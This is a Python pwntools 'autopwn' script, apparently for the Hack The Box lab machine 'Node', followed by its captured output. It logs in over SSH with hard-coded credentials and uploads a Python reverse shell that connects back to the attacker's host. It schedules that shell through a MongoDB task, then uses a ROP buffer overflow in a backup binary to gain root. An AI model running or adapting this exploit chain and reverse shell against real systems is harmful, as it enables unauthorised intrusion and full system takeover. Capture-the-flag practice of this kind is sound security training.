#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import time
from pwn import *
from subprocess import call


DEBUG = False
RHOST = "10.10.10.58"
RPORT = 22
RPATH = "/dev/shm/.a/"
LHOST = "10.10.15.154"
LPORT = 60001

if DEBUG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'


# Write and compile rootshell.c
with open("rootshell.c", "wt") as f:
    f.write("""#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    system("/bin/sh");
    return 0;
}
""")
    f.close()

if call(["gcc", "rootshell.c", "-o", "rootshell"]) == 0:
    log.info("Compilation of rootshell was successful")


# Connect to ssh and download /usr/local/bin/backup
mark_shell = ssh(host=RHOST, port=RPORT, user='mark', password='5AYRft73VtFpc84k')
log.info("User: "+mark_shell['whoami'])
mark_shell.download_file("/usr/local/bin/backup",local="./backup")


# Make payload
elf = ELF('./backup')
rop = ROP(elf)
rop.system(next(elf.search('/tmp/.backup')))
rop.exit()
log.info(rop.dump())
payload = "A"*(512) + str(rop)


# Upload python reverse shell 
log.info(mark_shell["mkdir -p "+RPATH])
mark_shell.upload_data("import os, pty, socket\n" 
"lhost = '" + LHOST + "'\n"
"lport =  " + str(LPORT) + "\n"
"\n"
"def main():\n"
"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
"    s.connect((lhost, lport))\n"
"    os.dup2(s.fileno(),0)\n"
"    os.dup2(s.fileno(),1)\n"
"    os.dup2(s.fileno(),2)\n"
"    os.putenv('HISTFILE','/dev/null')\n"
"    pty.spawn('/bin/bash')\n"
"    s.close()\n"
"\n"
"if __name__ == '__main__':\n"
"    main()\n", remote=RPATH+"shell.py")


# Upload payload and rootshell
mark_shell.upload_data(payload,remote=RPATH+"pld")
mark_shell.upload_file("rootshell",RPATH+"rootshell")


# Add python reverse shell task to mongodb 
mongodb = mark_shell.run("mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k")
mongodb.recv()
mongodb.sendline("db.tasks.insertOne({cmd:'/usr/bin/python2 /dev/shm/.a/shell.py'});")


# Get root
tom_shell = listen(LPORT).wait_for_connection()
tom_shell.clean(0)
tom_shell.sendline("cp "+RPATH+"rootshell /tmp/.backup_%i")
tom_shell.recv()
tom_shell.sendline("chmod +x /tmp/.backup_%i")
tom_shell.recv()
tom_shell.sendline("/usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(cat "+RPATH+"pld)")
tom_shell.interactive()

'''
$ ./autopwn_node.py
OUTPUT:
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/alamot/.pwntools-cache/update to 'never'.
[*] A newer version of pwntools is available on pypi (3.10.0 --> 3.12.0).
    Update with: $ pip install -U pwntools
[*] Compilation of rootshell was successful
[+] Connecting to 10.10.10.58 on port 22: Done
[!] Couldn't check security settings on '10.10.10.58'
[+] Opening new channel: 'whoami': Done
[+] Receiving all data: Done (5B)
[*] Closed SSH channel with 10.10.10.58
[*] User: mark
[+] Downloading '/usr/local/bin/backup' to './backup': Done
[*] '/home/alamot/HTB/BOXES/NODE_58/backup'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loading gadgets for '/home/alamot/HTB/BOXES/NODE_58/backup'
[*] 0x0000:        0x80486a0 system(134520533)
    0x0004:        0x80485c9 <adjust: pop ebx; ret>
    0x0008:        0x8049ed5 arg0
    0x000c:        0x80486c0 exit()
    0x0010:           'eaaa' <pad>
[+] Opening new channel: 'mkdir -p /dev/shm/.a/': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 10.10.10.58
[*] Uploading 'rootshell' to '/dev/shm/.a/rootshell'
[*] /dev/shm/.a/rootshell
[+] Opening new channel: 'mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k': Done
[+] Trying to bind to 0.0.0.0 on port 60000: Done
[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.58 on port 40756
[*] Switching to interactive mode
cp /dev/shm/.a/rootshell /tmp/.backup_%i
tom@node:/$ chmod +x /tmp/.backup_%i
tom@node:/$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740<backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $<4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(cat /dev/shm/.a/pld)



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# $ whoami
root
'''
